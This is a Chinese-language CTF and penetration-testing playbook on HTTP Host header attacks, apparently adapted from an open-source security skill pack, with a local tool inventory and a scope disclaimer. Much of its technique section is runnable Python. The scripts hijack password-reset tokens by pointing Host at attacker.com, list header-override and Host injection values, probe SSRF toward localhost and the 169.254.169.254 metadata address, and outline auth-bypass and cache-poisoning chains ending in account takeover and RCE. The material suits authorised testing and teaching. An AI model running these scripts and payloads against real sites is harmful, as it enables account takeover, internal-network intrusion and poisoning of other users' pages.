# Host Header 攻击

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/host-header.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「Host header / 密码重置劫持 / Host注入 / SSRF」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- Host header
- 密码重置劫持
- Host注入
- SSRF
- Cache Poisoning
- X-Forwarded-Host
- vhost

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. 攻击面
2. Host 到身份/回调/缓存 Oracle — Host 头不是单点技巧，它通常影响“绝对 URL 生成”和“上游代理取值”。先把所有会生成 URL 的功能列成矩阵：密码重置、邮箱验证、OAuth callback、支付 webhook、文件下载签名、Sitemap、…
3. 密码重置劫持
4. Host 头注入变体
5. 代理/框架取值优先级 — 同一个请求里放多个 header 时，要看谁覆盖谁：
6. Host → SSRF 链
7. Host 头鉴权绕过
8. Host → Cache Poisoning 链
9. Absolute URL 生成点 — Host 注入不只在密码重置里出现，所有“后端拼绝对 URL”的地方都值得测：

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **Evidence** — 保存 baseline、每个 header 变体、响应状态、`Location`、正文里出现的绝对 URL。
- **Evidence** — 对密码重置/邮箱验证记录：触发请求、邮件/预览里的最终链接、token 所属账号、token 是否可用。
- **Evidence** — 对 cache 场景记录：缓存命中头、cache key 推断、首个投毒请求和后续命中请求。
- **Evidence** — 新增 `host_absolute_url_oracle.csv`：header 名、反射点、绝对 URL、响应 hash、baseline 差异和下一跳。
- **Evidence** — 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 攻击面

```
Host 头被后端用于:
├── URL 生成 (密码重置链接、回调 URL)
├── 虚拟主机路由 (vhost)
├── 缓存 key 生成
├── SSO/IdP 回调验证
└── 密码重置 token 邮箱链接
```

### 0.1 Host 到身份/回调/缓存 Oracle

Host 头不是单点技巧，它通常影响“绝对 URL 生成”和“上游代理取值”。先把所有会生成 URL 的功能列成矩阵：密码重置、邮箱验证、OAuth callback、支付 webhook、文件下载签名、Sitemap、缓存响应。命中后立刻看 token、code、sign、cache key 和 SSRF 目标是否跟着 Host 变化。

| 功能 | Host 影响字段 | 成功 oracle | 下一跳 |
|---|---|---|---|
| 密码重置/邮箱验证 | reset link、verify link | 邮件/预览 URL 指向攻击者 host | 账号接管 |
| OAuth/OIDC | issuer、redirect_uri、callback URL | code/state 回到错 host | OAuth、JWT |
| 支付 webhook | `notify_url`, `return_url`, absolute callback | 回调地址或签名 base URL 变化 | 支付异步链 |
| 文件下载 | signed URL、CDN URL | sign 覆盖路径但不覆盖 host | 签名、文件下载 |
| SSRF/服务发现 | 内部 health URL | Host 变内网后响应差异 | SSRF |
| Cache | `Location`, canonical, OpenGraph | 缓存命中不同 Host 内容 | Cache deception/smuggling |

Host oracle 执行器：

```python
# host_absolute_url_oracle.py
import csv
import hashlib
import re
from pathlib import Path
import requests

OVERRIDES = ["Host", "X-Forwarded-Host", "X-Host", "X-Original-Host", "X-Forwarded-Server"]
URL_RX = re.compile(r"https?://[^\s\"'<>]+", re.I)

def probe_host_oracle(url, evil="attacker.example", normal="target.example"):
    base = requests.get(url, headers={"Host": normal}, timeout=8, allow_redirects=False)
    rows = []
    for header in OVERRIDES:
        headers = {"Host": normal}
        headers[header] = evil
        if header == "Host":
            headers = {"Host": evil}
        r = requests.get(url, headers=headers, timeout=8, allow_redirects=False)
        urls = URL_RX.findall(r.text[:4000] + "\n" + "\n".join(f"{k}: {v}" for k, v in r.headers.items()))
        rows.append({
            "header": header,
            "status": r.status_code,
            "length": len(r.text),
            "location": r.headers.get("Location", ""),
            "evil_reflected": evil in r.text or evil in r.headers.get("Location", ""),
            "body_sha1": hashlib.sha1(r.content[:2048]).hexdigest()[:12],
            "absolute_urls": "|".join(urls[:6]),
            "baseline_delta": len(r.text) - len(base.text),
        })
    Path("exports").mkdir(exist_ok=True)
    with open("exports/host_absolute_url_oracle.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=rows[0].keys())
        w.writeheader()
        w.writerows(rows)
    return rows
```

执行节奏：

1. 先打普通页面和会发邮件/回调的功能，比较 `Location`、HTML 绝对 URL、JSON `baseUrl`。
2. 命中 OAuth/OIDC 时保留 `state/code/issuer`，转 `../../../identity-federation/references/oauth-saml/oauth-sso.md` 做 callback 错配。
3. 命中支付回调/下载签名时保留签名原文，转签名和支付异步文档。
4. 命中内网 Host 响应差异时，把 Host 作为 SSRF 入口继续扫 metadata、Redis、内部 API。
5. 命中缓存头时记录 `Age/X-Cache/CF-Cache-Status`，转缓存链。

## 1. 密码重置劫持

```python
# 场景: POST /forgot {email: victim@x.com}
# 后端生成重置链接: https://{Host}/reset?token=xxx

# 攻击: 修改 Host 头
# Host: attacker.com
# → 受害者收到的邮件链接: https://attacker.com/reset?token=xxx
# → 攻击者拿到 token

import requests

def hijack_password_reset(target: str):
    """修改 Host 头劫持重置 token"""
    r = requests.post(f"{target}/forgot", data={
        "email": "victim@victim.com"
    }, headers={
        "Host": "attacker.com",
        "X-Forwarded-Host": "attacker.com",  # 如果后端用这个
    })
    return r.status_code
```

## 2. Host 头注入变体

```python
HOST_VALUES = [
    "attacker.com",
    "target.com:1337",
    "target.com@attacker.com",
    "attacker.com#target.com",
    "attacker.com%23target.com",
    "attacker.com%2ftarget.com",
    "target.com.evil.com",
    "localhost",
    "127.0.0.1",
    "[::1]",
]

OVERRIDE_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "X-Original-Host",
    "X-Rewrite-URL",
    "Forwarded",
]
```

### 2.1 代理/框架取值优先级

| 层 | 常见取值 | 打点动作 | 命中信号 |
|---|---|---|---|
| Web server | `Host` | 改 Host 观察 vhost/跳转 | `Location`、页面标题变化 |
| 反向代理 | `X-Forwarded-Host` | Host 正常，XFH 改 evil | 生成链接使用 XFH |
| CDN | `Forwarded: host=` | 加 RFC 7239 header | 缓存 key 或跳转变化 |
| 应用框架 | `X-Original-Host` / `X-Host` | 多 header 竞争 | 密码重置/回调 URL 变化 |
| 业务配置 | `base_url` | Header 全改也无效 | 固定域名输出 |

同一个请求里放多个 header 时，要看谁覆盖谁：

```python
import requests

def host_header_matrix(url, evil="attacker.example"):
    baseline = requests.get(url, allow_redirects=False)
    tests = []
    for header in OVERRIDE_HEADERS:
        headers = {"Host": "target.example"}
        if header == "Forwarded":
            headers[header] = f"host={evil};proto=https"
        else:
            headers[header] = evil
        tests.append((header, headers))
    tests.append(("Host", {"Host": evil}))

    for name, headers in tests:
        r = requests.get(url, headers=headers, allow_redirects=False, timeout=8)
        loc = r.headers.get("Location", "")
        changed = (r.status_code, loc, len(r.text)) != (
            baseline.status_code,
            baseline.headers.get("Location", ""),
            len(baseline.text),
        )
        print(name, r.status_code, changed, loc[:160])
```

成功样本：`Location`、邮件预览、JSON 中 `baseUrl`、HTML canonical URL、OpenGraph URL、OAuth callback 使用了攻击者 host。失败样本：只返回 `400 Bad Request`，说明 Web server 层已经拦掉，还没进入应用。

## 3. Host → SSRF 链

```python
# 如果后端用 Host 头拼接 URL 做服务间调用:
# GET /api/status → 后端请求 http://{Host}/internal/health
# Host: 127.0.0.1 → 后端请求 http://127.0.0.1/internal/health
# → SSRF 打内网服务

# 探测: 修改 Host 为内网地址
for internal in ["127.0.0.1", "localhost", "0.0.0.0", "[::1]", "169.254.169.254"]:
    r = requests.get(target, headers={"Host": internal})
    if r.status_code != baseline:
        print(f"[!] {internal} → {r.status_code}")
```

## 4. Host 头鉴权绕过

```python
# 如果鉴权逻辑基于 Host:
# if Host == "admin.internal" → 跳过认证
# 攻击: Host: admin.internal → 直接进后台

# 或者: Host: localhost → 触发 debug 模式 → 报错泄露源码
```

## 5. Host → Cache Poisoning 链

```python
# Host 头如果不在 Cache Key 中:
# 首次请求 Host: evil.com → CDN 缓存响应
# 后续所有用户看到此缓存 → XSS/Phish
# 详见 08-infra/race-cache-smuggling.md
```

### 5.1 Absolute URL 生成点

Host 注入不只在密码重置里出现，所有“后端拼绝对 URL”的地方都值得测：

| 功能 | 观察位置 | Payload |
|---|---|---|
| 密码重置 | 邮件链接/预览接口 | `Host: attacker.com` |
| 邮箱验证 | verify link | `X-Forwarded-Host` |
| OAuth/OIDC | `redirect_uri` / issuer | `Forwarded: host=` |
| Sitemap/RSS | `<loc>` / feed link | Host/XFH |
| 文件下载 | signed URL | Host 带端口/协议 |
| Webhook | callback URL | `X-Forwarded-Proto: http` |
| Cache | `Location` / canonical | Host 不进 cache key |

如果目标有“发送邮件但看不到邮件”的限制，优先找同功能的预览接口、队列日志、前端 toast、`/api/debug/mail`、管理后台邮件模板记录。

## 6. 攻击链

```
Host 注入 → 密码重置 token 泄露 → Account Takeover
Host 注入 → 后端 URL 拼接 → SSRF → 内网 RCE
Host: localhost → Debug 模式 → 源码泄露 → 硬编码密钥
Host override → Vhost 路由绕过 → 管理后台 → RCE
```

## 工具引用

```bash
# 项目内 HTTP 探测框架
python scripts/ctf-website/http_probe.py

# 安装第三方工具
powershell scripts/ctf-website/install_missing_tools.ps1
```

## Evidence

- 保存 baseline、每个 header 变体、响应状态、`Location`、正文里出现的绝对 URL。
- 对密码重置/邮箱验证记录：触发请求、邮件/预览里的最终链接、token 所属账号、token 是否可用。
- 对 cache 场景记录：缓存命中头、cache key 推断、首个投毒请求和后续命中请求。
- 新增 `host_absolute_url_oracle.csv`：header 名、反射点、绝对 URL、响应 hash、baseline 差异和下一跳。
- 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
